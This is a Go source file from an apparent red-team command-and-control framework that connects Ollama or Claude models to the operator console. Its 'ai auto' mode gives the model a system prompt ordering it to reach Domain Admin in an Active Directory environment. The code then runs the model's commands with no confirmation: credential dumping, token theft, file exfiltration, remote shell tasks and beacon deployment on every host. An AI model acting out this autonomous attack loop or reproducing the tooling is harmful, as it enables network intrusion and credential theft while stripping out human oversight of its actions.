package client

import (
	"bufio"
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"os"
	"os/signal"
	"regexp"
	"strings"
	"sync/atomic"
	"syscall"
	"time"

	"redteam/server"
)

// ── Shared message type ───────────────────────────────────────────────────

type ollamaMsg struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}

type ollamaReq struct {
	Model    string         `json:"model"`
	Messages []ollamaMsg    `json:"messages"`
	Stream   bool           `json:"stream"`
	Options  map[string]any `json:"options,omitempty"`
}

type ollamaResp struct {
	Message ollamaMsg `json:"message"`
	Done    bool      `json:"done"`
	Error   string    `json:"error,omitempty"`
}

const aiDefaultURL = "http://localhost:11434"

// ollamaURL returns the effective Ollama URL: flag > OLLAMA_HOST env > default.
// Normalizes bare host:port → http://host:port.
func resolveOllamaURL(flagURL string) string {
	u := flagURL
	if u == "" {
		u = os.Getenv("OLLAMA_HOST")
	}
	if u == "" {
		u = aiDefaultURL
	}
	// Normalize: if no scheme, add http://
	if !strings.HasPrefix(u, "http://") && !strings.HasPrefix(u, "https://") {
		u = "http://" + u
	}
	return u
}
const aiMaxIter    = 40
const aiMaxOut     = 5000

var reCmdTag  = regexp.MustCompile(`(?s)<cmd>(.*?)</cmd>`)
var reDoneTag = regexp.MustCompile(`(?i)<done>`)
var reANSI    = regexp.MustCompile(`\x1b\[[0-9;]*[a-zA-Z]`)

// aiActive: cuando es 1 suprime las notificaciones de background.
var aiActive atomic.Int32

// ── Ollama helpers ────────────────────────────────────────────────────────

func ollamaListModels(url string) []string {
	resp, err := http.Get(url + "/api/tags")
	if err != nil {
		return nil
	}
	defer resp.Body.Close()
	var r struct {
		Models []struct{ Name string `json:"name"` } `json:"models"`
	}
	json.NewDecoder(resp.Body).Decode(&r)
	names := make([]string, len(r.Models))
	for i, m := range r.Models {
		names[i] = m.Name
	}
	return names
}

func ollamaChat(url, model string, msgs []ollamaMsg) (string, error) {
	body, _ := json.Marshal(ollamaReq{
		Model:    model,
		Messages: msgs,
		Stream:   false,
		Options:  map[string]any{"temperature": 0.15, "num_predict": 2048},
	})
	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Post(url+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("ollama: %w", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)
	var r ollamaResp
	if err := json.Unmarshal(raw, &r); err != nil {
		return "", fmt.Errorf("ollama respuesta inválida: %s", raw[:min(len(raw), 300)])
	}
	if r.Error != "" {
		return "", fmt.Errorf("ollama error: %s", r.Error)
	}
	return r.Message.Content, nil
}

var reThinkBlock = regexp.MustCompile(`(?s)<think>(.*?)</think>`)

// ollamaChatStream streams tokens from Ollama and calls cb with each chunk.
// cb receives (token, insideThink). Returns the full response when done.
func ollamaChatStream(url, model string, msgs []ollamaMsg, cb func(tok string, think bool)) (string, error) {
	body, _ := json.Marshal(ollamaReq{
		Model:    model,
		Messages: msgs,
		Stream:   true,
		Options:  map[string]any{"temperature": 0.15, "num_predict": 2048},
	})
	client := &http.Client{Timeout: 10 * time.Minute}
	resp, err := client.Post(url+"/api/chat", "application/json", bytes.NewReader(body))
	if err != nil {
		return "", fmt.Errorf("ollama: %w", err)
	}
	defer resp.Body.Close()

	var full strings.Builder
	inThink := false
	scanner := bufio.NewScanner(resp.Body)
	scanner.Buffer(make([]byte, 1<<20), 1<<20)
	for scanner.Scan() {
		line := scanner.Bytes()
		if len(line) == 0 {
			continue
		}
		var chunk struct {
			Message struct {
				Content string `json:"content"`
			} `json:"message"`
			Done  bool   `json:"done"`
			Error string `json:"error"`
		}
		if json.Unmarshal(line, &chunk) != nil {
			continue
		}
		if chunk.Error != "" {
			return "", fmt.Errorf("ollama: %s", chunk.Error)
		}
		tok := chunk.Message.Content
		if tok != "" {
			full.WriteString(tok)
			// Track <think> state across tokens
			acc := full.String()
			wasThink := inThink
			if !inThink && strings.Contains(acc, "<think>") {
				inThink = true
			}
			if inThink && strings.Contains(acc, "</think>") {
				inThink = false
			}
			if cb != nil {
				cb(tok, wasThink || inThink)
			}
		}
		if chunk.Done {
			break
		}
	}
	return full.String(), scanner.Err()
}

// ── Claude (Anthropic) ───────────────────────────────────────────────────

type claudeContent struct {
	Type string `json:"type"`
	Text string `json:"text"`
}

type claudeResp struct {
	Content []claudeContent `json:"content"`
	Error   *struct {
		Message string `json:"message"`
	} `json:"error,omitempty"`
}

// claudeChat calls the Anthropic Messages API.
// msgs must use role "user"/"assistant" alternating; system prompt is extracted
// automatically from the first message with role "system".
func claudeChat(apiKey, model string, msgs []ollamaMsg) (string, error) {
	// Extract system prompt
	system := ""
	var filtered []map[string]string
	for _, m := range msgs {
		if m.Role == "system" {
			system = m.Content
			continue
		}
		filtered = append(filtered, map[string]string{"role": m.Role, "content": m.Content})
	}
	if len(filtered) == 0 {
		return "", fmt.Errorf("claude: no messages")
	}

	payload := map[string]any{
		"model":      model,
		"max_tokens": 4096,
		"messages":   filtered,
	}
	if system != "" {
		payload["system"] = system
	}

	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", apiKey)
	req.Header.Set("anthropic-version", "2023-06-01")

	client := &http.Client{Timeout: 5 * time.Minute}
	resp, err := client.Do(req)
	if err != nil {
		return "", fmt.Errorf("claude: %w", err)
	}
	defer resp.Body.Close()
	raw, _ := io.ReadAll(resp.Body)

	var r claudeResp
	if err := json.Unmarshal(raw, &r); err != nil {
		return "", fmt.Errorf("claude respuesta inválida: %s", raw[:min(len(raw), 300)])
	}
	if r.Error != nil {
		return "", fmt.Errorf("claude error: %s", r.Error.Message)
	}
	if len(r.Content) == 0 {
		return "", fmt.Errorf("claude: respuesta vacía")
	}
	return r.Content[0].Text, nil
}

// aiChat dispatches to Ollama or Claude based on provider.
func aiChat(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg) (string, error) {
	if provider == "claude" {
		return claudeChat(apiKey, model, msgs)
	}
	return ollamaChat(ollamaURL, model, msgs)
}

// claudeChatStream streams tokens from the Anthropic Messages API via SSE.
func claudeChatStream(apiKey, model string, msgs []ollamaMsg, cb func(tok string)) (string, error) {
	system := ""
	var filtered []map[string]string
	for _, m := range msgs {
		if m.Role == "system" {
			system = m.Content
			continue
		}
		filtered = append(filtered, map[string]string{"role": m.Role, "content": m.Content})
	}
	if len(filtered) == 0 {
		return "", fmt.Errorf("claude: no messages")
	}
	payload := map[string]any{
		"model":      model,
		"max_tokens": 4096,
		"stream":     true,
		"messages":   filtered,
	}
	if system != "" {
		payload["system"] = system
	}
	body, _ := json.Marshal(payload)
	req, _ := http.NewRequest("POST", "https://api.anthropic.com/v1/messages", bytes.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("x-api-key", apiKey)
	req.Header.Set("anthropic-version", "2023-06-01")

	hc := &http.Client{Timeout: 5 * time.Minute}
	resp, err := hc.Do(req)
	if err != nil {
		return "", fmt.Errorf("claude: %w", err)
	}
	defer resp.Body.Close()
	if resp.StatusCode != 200 {
		raw, _ := io.ReadAll(resp.Body)
		return "", fmt.Errorf("claude HTTP %d: %s", resp.StatusCode, string(raw[:min(len(raw), 300)]))
	}

	var full strings.Builder
	scanner := bufio.NewScanner(resp.Body)
	scanner.Buffer(make([]byte, 1<<20), 1<<20)
	for scanner.Scan() {
		line := scanner.Text()
		if !strings.HasPrefix(line, "data: ") {
			continue
		}
		data := line[6:]
		if data == "[DONE]" {
			break
		}
		var ev struct {
			Type  string `json:"type"`
			Delta struct {
				Type string `json:"type"`
				Text string `json:"text"`
			} `json:"delta"`
		}
		if json.Unmarshal([]byte(data), &ev) != nil {
			continue
		}
		if ev.Type == "content_block_delta" && ev.Delta.Type == "text_delta" && ev.Delta.Text != "" {
			full.WriteString(ev.Delta.Text)
			if cb != nil {
				cb(ev.Delta.Text)
			}
		}
	}
	return full.String(), scanner.Err()
}

// aiChatStream dispatches streaming to Ollama or Claude.
func aiChatStream(provider, ollamaURL, apiKey, model string, msgs []ollamaMsg, cb func(tok string)) (string, error) {
	if provider == "claude" {
		return claudeChatStream(apiKey, model, msgs, cb)
	}
	return ollamaChatStream(ollamaURL, model, msgs, func(tok string, _ bool) { cb(tok) })
}

// ── output capture ────────────────────────────────────────────────────────

// captureOutput runs f() and returns everything written to stdout+stderr.
func captureOutput(f func()) string {
	oldOut, oldErr := os.Stdout, os.Stderr
	rOut, wOut, e1 := os.Pipe()
	rErr, wErr, e2 := os.Pipe()
	if e1 != nil || e2 != nil {
		f()
		return ""
	}
	os.Stdout, os.Stderr = wOut, wErr

	outC := make(chan string, 1)
	errC := make(chan string, 1)
	go func() { var b bytes.Buffer; io.Copy(&b, rOut); outC <- b.String() }()
	go func() { var b bytes.Buffer; io.Copy(&b, rErr); errC <- b.String() }()

	f()

	wOut.Close()
	wErr.Close()
	os.Stdout, os.Stderr = oldOut, oldErr

	out := <-outC + <-errC
	return out
}

// captureTask calls the C2 API directly and returns the result string.
func (cl *CLI) captureTask(agentID, taskType, args string, payload []byte) string {
	tid, err := cl.c.QueueTask(agentID, taskType, args, payload)
	if err != nil {
		return "[error encolando tarea: " + err.Error() + "]"
	}
	r, err := cl.c.WaitResult(agentID, tid, 5*time.Minute)
	if err != nil {
		return "[timeout: " + err.Error() + "]"
	}
	out := r.Output
	if r.Error != "" {
		if out != "" {
			out += "\n"
		}
		out += "[err] " + r.Error
	}
	return out
}

func truncateOut(s string, max int) string {
	s = reANSI.ReplaceAllString(s, "")
	if len(s) <= max {
		return s
	}
	head := max * 2 / 3
	tail := max / 5
	return fmt.Sprintf("%s\n\n[... %d bytes omitidos ...]\n\n%s",
		s[:head], len(s)-head-tail, s[len(s)-tail:])
}

func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}

// ── agent/job listing for AI context ─────────────────────────────────────

func (cl *CLI) aiAgentsList() string {
	raw, err := cl.c.Agents()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}
	var agents []*server.Agent
	if json.Unmarshal(raw, &agents) != nil || len(agents) == 0 {
		return "Sin agentes conectados."
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %s\n",
		"ID", "HOSTNAME", "USER", "IP", "TRANSP", "STATUS")
	for _, a := range agents {
		id := a.ID
		if len(id) > 8 {
			id = id[:8]
		}
		status := "active"
		if server.IsStale(a) || !a.Active {
			status = "stale"
		}
		fmt.Fprintf(&sb, "%-8s  %-15s  %-20s  %-15s  %-6s  %s\n",
			id, a.Hostname, a.Username, a.IP, a.Transport, status)
	}
	return sb.String()
}

func (cl *CLI) aiJobsList() string {
	raw, err := cl.c.Jobs()
	if err != nil {
		return "[error: " + err.Error() + "]"
	}
	var jobs []*server.Job
	json.Unmarshal(raw, &jobs)
	if len(jobs) == 0 {
		return "Sin listeners activos."
	}
	var sb strings.Builder
	fmt.Fprintf(&sb, "%-4s  %-10s  %-6s  %s\n", "ID", "PROTO", "PORT", "STATUS")
	for _, j := range jobs {
		fmt.Fprintf(&sb, "%-4d  %-10s  %-6d  %s\n", j.ID, j.Protocol, j.Port, j.Status)
	}
	return sb.String()
}

// ── AI command executor ───────────────────────────────────────────────────

// aiExec executes a single command line in capture mode (no terminal output).
// Agent commands go through the C2 API directly.
// Local tool commands use captureOutput to redirect stdout/stderr.
func (cl *CLI) aiExec(cmdLine string) string {
	cmdLine = strings.TrimSpace(cmdLine)
	if cmdLine == "" {
		return ""
	}

	// Shell passthrough
	if strings.HasPrefix(cmdLine, "!") {
		return captureOutput(func() { cl.runLocalShell(strings.TrimSpace(cmdLine[1:])) })
	}

	parts := strings.Fields(cmdLine)
	if len(parts) == 0 {
		return ""
	}
	cmd, args := parts[0], parts[1:]

	// Management
	switch cmd {
	case "agents":
		return cl.aiAgentsList()
	case "jobs":
		return cl.aiJobsList()
	case "use":
		if len(args) == 0 {
			return "[error: use <id>]"
		}
		cl.current = args[0]
		return "[agente seleccionado: " + args[0] + "]"
	}

	// Agent commands — direct API, no stdout dependency
	if cl.current != "" {
		switch cmd {
		case "shell":
			return cl.captureTask(cl.current, "SHELL", strings.Join(args, " "), nil)
		case "ls":
			path := ""
			if len(args) > 0 {
				path = strings.Join(args, " ")
			}
			return cl.captureTask(cl.current, "LS", path, nil)
		case "pwd":
			return cl.captureTask(cl.current, "PWD", "", nil)
		case "cd":
			path := ""
			if len(args) > 0 {
				path = strings.Join(args, " ")
			}
			return cl.captureTask(cl.current, "CD", path, nil)
		case "cat":
			return cl.captureTask(cl.current, "CAT", strings.Join(args, " "), nil)
		case "ps":
			return cl.captureTask(cl.current, "PS", "", nil)
		case "env":
			return cl.captureTask(cl.current, "ENV", "", nil)
		case "mkdir":
			return cl.captureTask(cl.current, "MKDIR", strings.Join(args, " "), nil)
		case "rm":
			return cl.captureTask(cl.current, "RM", strings.Join(args, " "), nil)
		case "token":
			if len(args) == 0 {
				return "[error: token whoami|steal|make|drop]"
			}
			switch args[0] {
			case "whoami":
				return cl.captureTask(cl.current, "TOKEN_WHOAMI", "", nil)
			case "steal":
				if len(args) < 2 {
					return "[error: token steal <pid>]"
				}
				return cl.captureTask(cl.current, "TOKEN_STEAL", args[1], nil)
			case "make":
				if len(args) < 3 {
					return "[error: token make <user> <pass>]"
				}
				return cl.captureTask(cl.current, "TOKEN_MAKE", args[1]+" "+args[2], nil)
			case "drop":
				return cl.captureTask(cl.current, "TOKEN_DROP", "", nil)
			}
		case "socks":
			if len(args) == 0 {
				return "[error: socks <port>]"
			}
			return cl.captureTask(cl.current, "SOCKS_START", args[0], nil)
		case "download":
			if len(args) == 0 {
				return "[error: download <path>]"
			}
			arg := fmt.Sprintf(`{"path":%q}`, args[0])
			return cl.captureTask(cl.current, "DOWNLOAD", arg, nil)
		}
	}

	// Everything else: local tool — capture stdout+stderr
	return captureOutput(func() { cl.dispatch(parts) })
}

// ── system prompts ────────────────────────────────────────────────────────

const aiAutoSystemPrompt = `You are an expert red team operator running a C2 framework on Kali Linux against an Active Directory environment. Your ONLY goal: achieve Domain Admin.

EXECUTION FORMAT — put every command inside <cmd></cmd> tags (one command per tag):
<cmd>scan 10.2.20.100</cmd>
<cmd>enum 10.2.20.100 -u user -p pass</cmd>

When Domain Admin is confirmed, output exactly:
<done>
## Domain Admin achieved
[credentials/hashes obtained, how you got there]
</done>

ATTACK METHODOLOGY:
1. Recon: scan → enum (null session) → lookupsid → getadusers
2. Initial creds: asrep → kerberoast → spray (if given passwords)
3. With creds: secretsdump (if admin) → certipy find -vulnerable → bloodhound
4. Pivot paths: ADCS (ESC1/ESC8) → RBCD → delegation → LAPS → DACL → shadow creds
5. Domain compromise: secretsdump DC → dump NTDS → verify DA hash with wmiexec

AVAILABLE COMMANDS:

=== AGENT (Windows target, use when agent active) ===
shell <cmd>                         cmd.exe execution
ls / pwd / cd / cat                 filesystem
ps / env                            process list, environment
token whoami                        current privileges
token steal <pid>                   steal token
download <path>                     exfiltrate file
dotnet-exec <assembly.exe> [args]   run .NET assembly in-process (Rubeus, SharpHound, Seatbelt, etc.)
                                    uses native CLR host — no sacrificial process, no donut

=== LOCAL ATTACK TOOLS (Kali) ===
scan <ip> [-p ports]
enum <ip> [-u u -p p]           SMB/LDAP via netexec
spray <ip> -u list.txt -p pass
asrep <ip> -d dom -u users.txt  AS-REP + john
kerberoast <ip> -d dom -u u -p p
secretsdump <ip> -u u -p p [-d dom]
bloodhound <ip> -d dom -u u -p p
lookupsid <ip> [-u u -p p]
samrdump <ip> -u u [-p p]
rpcdump <ip>
getadusers <ip> -d dom -u u -p p [-all]
getadcomputers <ip> -d dom -u u -p p
finddelegation <ip> -d dom -u u -p p
getlaps <ip> -d dom -u u -p p
gettgt <ip> -d dom -u u [-p p] [-H hash]   → exports KRB5CCNAME
getst <ip> -d dom -u u -spn <spn> [-impersonate admin]
wmiexec <ip> -u u [-p p] [-d dom] ['cmd']  (add cmd for non-interactive)
psexec  <ip> -u u [-p p] [-d dom]
smbexec <ip> -u u [-p p] [-d dom]
mssqlclient <ip> -u u [-p p] [-windows-auth]
dumpntlminfo <ip>
dacledit <ip> -d dom -u u -p p -action write -rights DCSync -principal u -target-dn 'DC=x,DC=y'
rbcd <ip> -d dom -u u -p p -action write -delegate-from EVIL$ -delegate-to TARGET$
addcomputer <ip> -d dom -u u -p p -name EVIL$ -cpass 'Pass!'
changepasswd <ip> -d dom -u u -p p -np newpass
certipy find <ip> -u u@dom -dc-ip <ip> -vulnerable
certipy req <ip> -u u@dom -p p -ca CA -template tmpl -upn admin@dom
certipy auth -pfx file.pfx -dc-ip <ip>
certipy shadow <ip> -u u@dom -p p -account victim -dc-ip <ip> auto
certipy relay -target http://<ca-ip>

=== AGENT DEPLOYMENT (get a real beacon on a pwned host) ===
listener start http <port>
build http <kali_ip> <port> [sleep_sec]
deliver <target_ip> -u <user> -p <pass> -d <domain>
deliver <target_ip> -u <user> -H <nthash> -d <domain>
wait_agent [timeout_sec]

DEPLOYMENT WORKFLOW — use this when you have valid credentials on any Windows host:
  <cmd>listener start http 8080</cmd>
  <cmd>build http <YOUR_KALI_IP> 8080 5</cmd>
  <cmd>deliver <target_ip> -u <user> -p <pass> -d <domain></cmd>
  <cmd>wait_agent 120</cmd>
→ On success wait_agent auto-selects the new agent. Then use shell/token/etc to continue.

=== MANAGEMENT ===
agents          list agents (use first 8 chars of ID)
use <id>        select agent
jobs            list listeners

RULES:
- Pass-the-hash: use -H :NThash (never quote colons in hashes)
- Kerberos: after gettgt, next command can use KRB5CCNAME implicitly
- Deploy an agent on EVERY host where you get admin credentials — do not just run wmiexec interactively
- After getting DA hash from secretsdump: deliver agent to DC, wait_agent, then shell whoami to confirm
- If a command fails, try alternative attack path
- Never repeat the same failed command
- Execute one command at a time, analyze output before proceeding
- Truncated output means the full result was received; proceed based on what you see`

const aiChatSystemPrompt = `You are an expert red team operator assistant for Active Directory pentests.
You have access to a C2 framework. Suggest commands using <cmd></cmd> tags — the operator will confirm before execution.

Commands: shell, ls, ps, env, token, scan, enum, spray, asrep, kerberoast, secretsdump, bloodhound, wmiexec, psexec, lookupsid, getadusers, finddelegation, getlaps, gettgt, getst, dacledit, rbcd, addcomputer, changepasswd, certipy find/req/auth/shadow, and more.
Be concise, technical, explain your reasoning.`

// ── ai auto ───────────────────────────────────────────────────────────────

func (cl *CLI) cmdAIAuto(target, domain, model, ollamaURL string) {
	aiActive.Store(1)
	defer aiActive.Store(0)

	// Auto-select active agent
	raw, _ := cl.c.Agents()
	var agents []*server.Agent
	json.Unmarshal(raw, &agents)
	for _, a := range agents {
		if a.Active && !server.IsStale(a) {
			cl.current = a.ID
			break
		}
	}

	agentCtx := cl.aiAgentsList()
	agentNote := "Sin agente activo — solo herramientas locales disponibles."
	if cl.current != "" {
		agentNote = fmt.Sprintf("Agente activo: %s (ID: %s)", func() string {
			for _, a := range agents {
				if a.ID == cl.current {
					return a.Username + "@" + a.Hostname
				}
			}
			return cl.current[:8]
		}(), cl.current[:8])
	}

	initialCtx := fmt.Sprintf(`TARGET IP:  %s
DOMAIN:     %s
LISTENERS:
%s
AGENTS:
%s
%s`, target, domain, cl.aiJobsList(), agentCtx, agentNote)

	msgs := []ollamaMsg{
		{Role: "system", Content: aiAutoSystemPrompt},
		{Role: "user", Content: fmt.Sprintf(
			"INITIAL CONTEXT:\n%s\n\nStart the pentest now. Target: %s domain %s. Achieve Domain Admin.",
			initialCtx, target, domain,
		)},
	}

	fmt.Printf("\n\033[33m╔══════════════════════════════════════════════════════╗\033[0m\n")
	fmt.Printf("\033[33m║  AI AUTO PENTEST — %s  dominio: %-15s   ║\033[0m\n", target, domain)
	fmt.Printf("\033[33m║  Modelo: %-25s  Iters max: %d      ║\033[0m\n", model, aiMaxIter)
	fmt.Printf("\033[33m╚══════════════════════════════════════════════════════╝\033[0m\n\n")

	// Ctrl+C handler
	stop := make(chan struct{})
	sigC := make(chan os.Signal, 1)
	signal.Notify(sigC, os.Interrupt, syscall.SIGTERM)
	go func() {
		<-sigC
		close(stop)
	}()
	defer signal.Stop(sigC)

	for iter := 1; iter <= aiMaxIter; iter++ {
		// Check stop signal
		select {
		case <-stop:
			fmt.Println("\n\033[31m[AI AUTO] Interrumpido.\033[0m")
			return
		default:
		}

		fmt.Printf("\033[36m┄┄┄┄┄ iter %d/%d ┄┄┄┄┄\033[0m\n", iter, aiMaxIter)
		fmt.Print("\033[90m[AI] razonando...\033[0m")

		response, err := ollamaChat(ollamaURL, model, msgs)
		fmt.Print("\r                        \r")
		if err != nil {
			fmt.Printf("\033[31m[ERROR] %v\033[0m\n", err)
			return
		}

		// Print reasoning (text outside <cmd> tags)
		reasoning := reCmdTag.ReplaceAllString(response, "")
		reasoning = strings.TrimSpace(reasoning)
		if reasoning != "" {
			// Strip <done> block from displayed reasoning text
			reasoning = reDoneTag.ReplaceAllString(reasoning, "")
			fmt.Printf("\033[33m[AI]\033[0m %s\n\n", strings.TrimSpace(reasoning))
		}

		// Done?
		if reDoneTag.MatchString(response) {
			fmt.Printf("\033[32m╔══════════════════════════════════╗\033[0m\n")
			fmt.Printf("\033[32m║  PENTEST COMPLETADO              ║\033[0m\n")
			fmt.Printf("\033[32m╚══════════════════════════════════╝\033[0m\n")
			return
		}

		// Extract and execute commands
		matches := reCmdTag.FindAllStringSubmatch(response, -1)
		if len(matches) == 0 {
			msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})
			msgs = append(msgs, ollamaMsg{Role: "user", Content: "Continúa con el siguiente paso. Ejecuta un comando."})
			continue
		}

		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})

		var resultBuf strings.Builder
		for _, m := range matches {
			cmdLine := strings.TrimSpace(m[1])
			if cmdLine == "" {
				continue
			}

			// Check stop between commands
			select {
			case <-stop:
				fmt.Println("\n\033[31m[AI AUTO] Interrumpido.\033[0m")
				return
			default:
			}

			fmt.Printf("\033[32m[EXEC]\033[0m \033[1m%s\033[0m\n", cmdLine)
			out := cl.aiExec(cmdLine)
			out = truncateOut(out, aiMaxOut)
			if out == "" {
				out = "(sin salida)"
			}
			fmt.Printf("\033[90m%s\033[0m\n", out)
			fmt.Fprintf(&resultBuf, "CMD: %s\nOUT:\n%s\n---\n", cmdLine, out)
		}

		msgs = append(msgs, ollamaMsg{
			Role:    "user",
			Content: resultBuf.String() + "\nAnalyze the results and proceed with the next step toward Domain Admin.",
		})
	}

	fmt.Printf("\n\033[33m[AI AUTO] Alcanzado el máximo de %d iteraciones.\033[0m\n", aiMaxIter)
}

// ── ai chat ───────────────────────────────────────────────────────────────

func (cl *CLI) cmdAIChat(model, ollamaURL string) {
	aiActive.Store(1)
	defer aiActive.Store(0)

	fmt.Printf("\n\033[33m[AI CHAT] Modelo: %s | 'exit' para salir\033[0m\n", model)
	fmt.Printf("\033[33m[AI CHAT] Los comandos se confirman antes de ejecutar\033[0m\n\n")

	msgs := []ollamaMsg{
		{Role: "system", Content: aiChatSystemPrompt},
	}

	// Initial context
	agentsList := cl.aiAgentsList()
	msgs = append(msgs, ollamaMsg{
		Role:    "user",
		Content: "Contexto inicial:\nAgentes:\n" + agentsList + "\nAgente seleccionado: " + func() string {
			if cl.current == "" {
				return "ninguno"
			}
			if len(cl.current) > 8 {
				return cl.current[:8]
			}
			return cl.current
		}(),
	})
	greeting, err := ollamaChat(ollamaURL, model, msgs)
	if err == nil {
		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: greeting})
		fmt.Printf("\033[33m[AI]\033[0m %s\n\n", reCmdTag.ReplaceAllString(greeting, ""))
	}

	cl.rl.SetPrompt("\033[36myou>\033[0m ")
	defer cl.updatePrompt()

	for {
		line, err := cl.rl.Readline()
		if err != nil {
			break
		}
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		if line == "exit" || line == "quit" {
			break
		}

		msgs = append(msgs, ollamaMsg{Role: "user", Content: line})
		fmt.Print("\033[90m[pensando...]\033[0m\n")

		response, err := ollamaChat(ollamaURL, model, msgs)
		if err != nil {
			fmt.Printf("\033[31m[ERROR] %v\033[0m\n", err)
			continue
		}
		msgs = append(msgs, ollamaMsg{Role: "assistant", Content: response})

		// Show reasoning
		reasoning := strings.TrimSpace(reCmdTag.ReplaceAllString(response, ""))
		if reasoning != "" {
			fmt.Printf("\033[33m[AI]\033[0m %s\n", reasoning)
		}

		// Handle proposed commands
		for _, m := range reCmdTag.FindAllStringSubmatch(response, -1) {
			cmdLine := strings.TrimSpace(m[1])
			if cmdLine == "" {
				continue
			}
			fmt.Printf("\n\033[32m[PROPUESTO]\033[0m %s\n", cmdLine)
			cl.rl.SetPrompt("¿Ejecutar? [S/n]: ")
			confirm, _ := cl.rl.Readline()
			cl.rl.SetPrompt("\033[36myou>\033[0m ")

			confirm = strings.ToLower(strings.TrimSpace(confirm))
			if confirm == "" || confirm == "s" || confirm == "y" || confirm == "si" || confirm == "yes" {
				out := cl.aiExec(cmdLine)
				out = truncateOut(out, aiMaxOut)
				if out == "" {
					out = "(sin salida)"
				}
				fmt.Printf("\033[90m%s\033[0m\n", out)

				// Feed result to AI
				msgs = append(msgs, ollamaMsg{
					Role:    "user",
					Content: fmt.Sprintf("Resultado de '%s':\n%s\n\n¿Qué observas? ¿Siguiente paso?", cmdLine, out),
				})
				fmt.Print("\033[90m[analizando...]\033[0m\n")
				analysis, err := ollamaChat(ollamaURL, model, msgs)
				if err == nil {
					msgs = append(msgs, ollamaMsg{Role: "assistant", Content: analysis})
					analysisText := strings.TrimSpace(reCmdTag.ReplaceAllString(analysis, ""))
					if analysisText != "" {
						fmt.Printf("\033[33m[AI]\033[0m %s\n", analysisText)
					}
				}
			} else {
				fmt.Println("[omitido]")
			}
		}
		fmt.Println()
	}

	fmt.Println("\033[33m[AI CHAT] Sesión terminada.\033[0m")
}

// ── cmdAI dispatch ────────────────────────────────────────────────────────

const aiUsage = `uso: ai <subcomando> [opciones]

  Asistente IA integrado con Ollama para análisis y automatización del pentest.

  Requisito: Ollama corriendo en localhost:11434
    Instalar Ollama:  curl -fsSL https://ollama.com/install.sh | sh
    Descargar modelo: ollama pull llama3.1:8b     (recomendado, 4.7GB)
                      ollama pull deepseek-r1:7b  (mejor razonamiento)
                      ollama pull qwen2.5:7b      (alternativa)

subcomandos:
  ai chat  [-m modelo] [-url url]
    Chat interactivo con el asistente IA.
    Propone comandos que tú confirmas antes de ejecutar.

  ai auto  <target> -d <domain> [-m modelo] [-url url]
    Pentest completamente autónomo hasta Domain Admin.
    El agente ejecuta todos los comandos solo, sin confirmación.
    Se detiene cuando logra DA o alcanza el máximo de iteraciones.

opciones:
  -m <modelo>    Modelo Ollama (default: auto-detecta el primero disponible)
  -url <url>     URL de Ollama (default: http://localhost:11434)

servidor Ollama:
  Por defecto usa la variable de entorno OLLAMA_HOST, o localhost:11434.
  export OLLAMA_HOST=http://192.168.31.85:11434   ← servidor remoto con GPU
  export OLLAMA_HOST=http://127.0.0.1:11435        ← puerto alternativo local

modelos recomendados:
  qwen3.6:35b-a3b-nvfp4  Modelo MoE de alto rendimiento (GPU recomendada)
  llama3.1:8b            Buen equilibrio velocidad/calidad
  deepseek-r1:7b         Mejor razonamiento, más lento
  qwen2.5:14b            Mayor contexto

ejemplos:
  ai chat
  ai chat -m qwen3.6:35b-a3b-nvfp4
  ai auto 10.2.20.100 -d cs.org
  ai auto 10.2.20.100 -d cs.org -m qwen3.6:35b-a3b-nvfp4
  ai auto 10.2.20.100 -d cs.org -url http://192.168.31.85:11434`

func (cl *CLI) cmdAI(args []string) {
	pos, flags := parseLocalFlags(args)
	if len(pos) == 0 {
		fmt.Println(aiUsage)
		return
	}

	ollamaURL := resolveOllamaURL(flags["url"])

	// Verify Ollama is reachable
	models := ollamaListModels(ollamaURL)
	if models == nil {
		fmt.Printf("\033[31m[!] No se puede conectar a Ollama en %s\033[0m\n", ollamaURL)
		fmt.Println("    Instala Ollama: curl -fsSL https://ollama.com/install.sh | sh")
		fmt.Println("    Inicia Ollama:  ollama serve")
		fmt.Println("    O exporta:      export OLLAMA_HOST=http://<ip>:11434")
		return
	}
	if len(models) == 0 {
		fmt.Printf("\033[31m[!] Ollama conectado (%s) pero sin modelos instalados.\033[0m\n", ollamaURL)
		fmt.Println("    Descarga uno:  ollama pull qwen3.6:35b-a3b-nvfp4")
		fmt.Println("                   ollama pull llama3.1:8b")
		fmt.Println("    Ver modelos:   ollama list")
		return
	}

	// Select model
	model := flags["m"]
	if model == "" {
		model = models[0]
		fmt.Printf("[*] Ollama: %s  |  modelo: %s\n", ollamaURL, model)
		if len(models) > 1 {
			fmt.Printf("[*] Otros disponibles: %s\n", strings.Join(models[1:], ", "))
		}
	}

	sub := pos[0]
	switch sub {
	case "chat":
		cl.cmdAIChat(model, ollamaURL)

	case "auto":
		if len(pos) < 2 || flags["d"] == "" {
			fmt.Println("uso: ai auto <target> -d <domain> [-m model] [-url url]")
			fmt.Println("ej:  ai auto 10.2.20.100 -d cs.org -m llama3.1:8b")
			return
		}
		cl.cmdAIAuto(pos[1], flags["d"], model, ollamaURL)

	default:
		fmt.Printf("[!] subcomando desconocido: %s\n\n", sub)
		fmt.Println(aiUsage)
	}
}
